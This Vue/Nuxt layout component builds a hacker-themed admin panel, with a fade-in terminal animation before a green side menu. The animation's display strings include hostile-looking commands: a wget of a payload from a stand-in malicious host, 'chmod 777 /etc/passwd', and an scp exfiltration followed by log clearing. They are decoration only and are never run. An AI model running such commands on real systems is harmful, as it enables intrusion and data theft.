<script setup>
const hackerScreen = ref();
const codeContainer = ref();
const firsthalf = ref(true);
const starting = ref(true);
const starting2 = ref(true);
const btn1 = ref(false);
const btn2 = ref(false);
const btn3 = ref(false);
const btn4 = ref(false);
const but1 = ref();
const but2 = ref();
const but3 = ref();
const but4 = ref();

const codeLines = ref([
  { text: 'Initializing system...', opacity: 0 },
  { text: 'Loading modules...', opacity: 0 },
  { text: 'Scanning for vulnerabilities...', opacity: 0 },
  { text: 'Accessing mainframe...', opacity: 0 },
  { text: 'Decrypting files...', opacity: 0 },
  { text: 'Applying patches...', opacity: 0 },
  { text: 'Establishing database connection...', opacity: 0 },
  { text: 'Success.', opacity: 0 }
]);

const codeLines2 = ref([
  { text: 'root@machine:~# ifconfig', opacity: 0 },
  { text: 'inet 192.168.0.1', opacity: 0 },
  { text: 'netstat -an | grep LISTEN', opacity: 0 },
  { text: 'tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN', opacity: 0 },
  { text: 'ping -c 4 192.168.0.100', opacity: 0 },
  { text: '64 bytes from 192.168.0.100: icmp_seq=1 ttl=64 time=0.123 ms', opacity: 0 },
  { text: 'nmap -p 1-65535 192.168.0.100', opacity: 0 },
  { text: 'PORT     STATE SERVICE', opacity: 0 },
  { text: '22/tcp open  ssh', opacity: 0 },
  { text: '80/tcp open  http', opacity: 0 },
  { text: 'Attempting to exploit vulnerability...', opacity: 0 },
  { text: 'Connecting to 192.168.0.100...', opacity: 0 },
  { text: 'Access granted!', opacity: 0 },
  { text: 'Downloading data...', opacity: 0 },
  { text: 'Data retrieved successfully.', opacity: 0 },
  { text: 'root@machine:~# ls /var/www/html', opacity: 0 },
  { text: 'index.html', opacity: 0 },
  { text: 'config.php', opacity: 0 },
  { text: 'secret.txt', opacity: 0 },
  { text: 'cat secret.txt', opacity: 0 },
  { text: 'Password: hunter2', opacity: 0 },
  { text: 'chmod 777 /etc/passwd', opacity: 0 },
  { text: 'Changing permissions...', opacity: 0 },
  { text: 'root@machine:~# curl http://example.com', opacity: 0 },
  { text: 'HTTP/1.1 200 OK', opacity: 0 },
  { text: 'Content-Type: text/html', opacity: 0 },
  { text: 'Downloading malicious payload...', opacity: 0 },
  { text: 'wget http://malicious.com/payload.sh', opacity: 0 },
  { text: 'Executing payload...', opacity: 0 },
  { text: 'root@machine:~# ps aux | grep malicious', opacity: 0 },
  { text: 'root     12345  0.0  0.0  123456  7890 ?        S    12:00   0:00 /usr/bin/malicious', opacity: 0 },
  { text: 'Task completed!', opacity: 0 },
  { text: 'Checking logs...', opacity: 0 },
  { text: 'tail -n 10 /var/log/syslog', opacity: 0 },
  { text: 'Oct 29 12:00:00 machine sshd[1234]: Accepted password for user from 192.168.0.101', opacity: 0 },
  { text: 'Oct 29 12:01:00 machine CRON[1235]: (root) CMD (bash /path/to/script.sh)', opacity: 0 },
  { text: 'Exfiltrating data to remote server...', opacity: 0 },
  { text: 'scp /path/to/data.txt user@192.168.0.102:/remote/path', opacity: 0 },
  { text: 'Transfer complete!', opacity: 0 },
  { text: 'Cleaning up...', opacity: 0 },
  { text: 'rm /path/to/data.txt', opacity: 0 },
  { text: 'Logs cleared!', opacity: 0 },
  { text: 'Disconnecting from server...', opacity: 0 },
  { text: 'Goodbye!', opacity: 0 },
]);

const scrollToBottom = () => {
  if (codeContainer.value) {
    codeContainer.value.scrollTop = 1800;
  }
};


onMounted(() => {
  // Fade in first set of lines
  let delay = 0;
  codeLines.value.forEach((line, index) => {
    setTimeout(() => {
      line.opacity = 1;
      index++
      firsthalf.value = index == 8 ? false : true;
    }, delay);
    delay += 200;

  });
  

  // After the first set is done, start fading in the second set
  setTimeout(() => {
    let delay2 = 0;
    codeLines2.value.forEach((line, index) => {
      setTimeout(() => {
        line.opacity = 1;
        scrollToBottom();
        index++
        starting2.value = index == 44 ? false : true
        if (index == 44) {
          setTimeout(() => {
            btn1.value = true;
          }, 50);
          setTimeout(() => {
            btn2.value = true;
          }, 100);
          setTimeout(() => {
            btn3.value = true;
          }, 150);
          setTimeout(() => {
            btn4.value = true;
          }, 200);
          setTimeout(() => {
            starting.value = false;
          }, 4000);
        }
      }, delay2);
      delay2 += 25;
    });
  }, delay);
});
</script>

<template>
    <title>stab - admin</title>
    <div class="mainFrame">
      <div class="sidemenu" v-if="!starting2">
        <NuxtLink class="greentxt btn floatin" :class="starting ?  'glitch-text' : ''" to="/stab/admin" aria-label="ERROR[]" v-if="btn1" ref="but1">HOME</NuxtLink>
        <NuxtLink class="greentxt btn floatin" :class="starting ?  'glitch-text' : ''" to="/stab/admin/userdata" aria-label="ERROR[]" v-if="btn2" ref="but2">USER DATA</NuxtLink>
        <NuxtLink class="greentxt btn floatin" :class="starting ?  'glitch-text' : ''" to="/stab/admin/data" aria-label="ERROR[]" v-if="btn3" ref="but3">MANAGE DATA</NuxtLink>
        <NuxtLink class="greentxt btn floatin" :class="starting ?  'glitch-text' : ''" to="/stab/admin/logs" aria-label="ERROR[]" v-if="btn4" ref="but4">LOGS</NuxtLink>
    </div>
    <div class="main">
      <slot/>
    </div>
    </div>
    <div class="startanimcont" ref="hackerScreen" v-if="starting2">
        <div class="code" ref="codeContainer">
          <p v-for="(line, index) in codeLines" :key="index" :style="{ opacity: line.opacity }" class="greentxt code" style="user-select: none;" v-if="firsthalf">
            {{ line.text }}
          </p>
          <p v-for="(line, index) in codeLines2" :key="'second-' + index" :style="{ opacity: line.opacity }" class="greentxt code" style="user-select: none;">
        {{ line.text }}
      </p>
        </div>
    </div>


</template>



<style scoped>
    .mainFrame {
      display: grid;
      width: 100vw;
      min-height: 100vh;
      grid-template-columns: minmax(250px, 1fr) 6fr; /* 250px minimum for sidemenu, responsive space for main */
    }
    .main {
      width: auto;
      height: 100vh;
      background-color: #000000;
    }

    .code {
        position: relative; /* Position for text scrolling */
        overflow-y: auto; /* Enable vertical scrolling */
        white-space: pre-wrap; /* Preserve whitespace for code-like formatting */
        box-sizing: border-box; /* Include padding in height calculation */
    }

    p {
      margin: 0.5rem; /* Spacing between lines */
      opacity: 0; /* Start invisible */
      animation: fade-in 0.5s forwards; /* Fade-in effect */
    }

    .startanimcont {
      position: fixed;
      left: 0;
      top: 0;
      margin: 0;
      z-index: 2;
      background-color: black; /* Dark background for hacking effect */
      color: #00ff00; /* Bright green text */
      font-family: 'Courier New', Courier, monospace; /* Monospace font for a terminal look */
      height: 100vh; /* Full viewport height */
      overflow-y: visible;
      width: 100vw;
    }
    .glitch-text {
      font-family: 'Courier New', Courier, monospace;
      color: #00FF00;
      font-size: 3rem;
      position: relative;
      display: inline-block;
      text-shadow: 0 0 5px rgba(0, 255, 0, 0.6);
      animation: glitch 0.5s infinite;
    }

    /* Glitch Effect Layers */
    .glitch-text::before,
    .glitch-text::after {
      content: attr(aria-label);
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      color: #00FF00;
      background: black;
      overflow: hidden;
      clip: rect(0, 900px, 0, 0);
    }

    .glitch-text::before {
      left: -2px;
      text-shadow: -2px 0 red;
      animation: glitchTop 0.2s infinite linear alternate-reverse;
    }

    .glitch-text::after {
      left: 2px;
      text-shadow: -2px 0 blue;
      animation: glitchBottom 1.8s infinite linear alternate-reverse;
    }

    /* Keyframe Animations */
    @keyframes glitch {
      0% {
        transform: skew(0.5deg);
      }
      20% {
        transform: skew(0.5deg) translate(0, -1px);
      }
      40% {
        transform: skew(0.5deg) translate(-1px, 0);
      }
      60% {
        transform: skew(0.5deg) translate(1px, 0);
      }
      80% {
        transform: skew(0.5deg) translate(0, 1px);
      }
      100% {
        transform: skew(0.5deg);
      }
    }

    @keyframes glitchTop {
      0% {
        clip: rect(0, 900px, 0, 0);
      }
      20% {
        clip: rect(10px, 900px, 50px, 0);
      }
      40% {
        clip: rect(85px, 900px, 115px, 0);
      }
      60% {
        clip: rect(115px, 900px, 155px, 0);
      }
      80% {
        clip: rect(145px, 900px, 185px, 0);
      }
      100% {
        clip: rect(190px, 900px, 225px, 0);
      }
    }

    @keyframes glitchBottom {
      0% {
        clip: rect(190px, 900px, 225px, 0);
      }
      20% {
        clip: rect(145px, 900px, 185px, 0);
      }
      40% {
        clip: rect(115px, 900px, 155px, 0);
      }
      60% {
        clip: rect(85px, 900px, 115px, 0);
      }
      80% {
        clip: rect(10px, 900px, 50px, 0);
      }
      100% {
        clip: rect(0, 900px, 0, 0);
      }
    }

    @keyframes floatin {
      to {
        left: 0;
      }
    }



    /*--------------------------------------------------*/

    a:-webkit-any-link {
        color: #33FF33;
    }
    body {
        background-color: #000000;
        overflow: hidden;
    }
    .greentxt {
        font-family: 'Courier New', Courier, monospace;
        color: #33FF33; /* Neon green */
        text-shadow: 0 0 5px rgba(0, 255, 0, 0.6); /* Subtle glow */
        font-size: 1.4rem;
        font-weight: 700;
    }

    .btn {
        margin-bottom: 30px;
        cursor: pointer;
        user-select: none;
        text-decoration: none;
        position: relative;
        left: -200px;
    }
    .floatin {
      animation: floatin 0.4s cubic-bezier(0.6, -0.28, 0.735, 0.045) forwards;
    }

    .btn:hover {
        color: #047504;
    }

    .btn::before {
        content: '> ';
    }

    .sidemenu {
        position: relative;
        top: 0;
        left: 0;
        width: fit-content;
        max-width: 250px;
        height: 100vh;
        padding: 25px;
        display: flex;
        flex-direction: column;
        background-color: black;
    }
    
</style>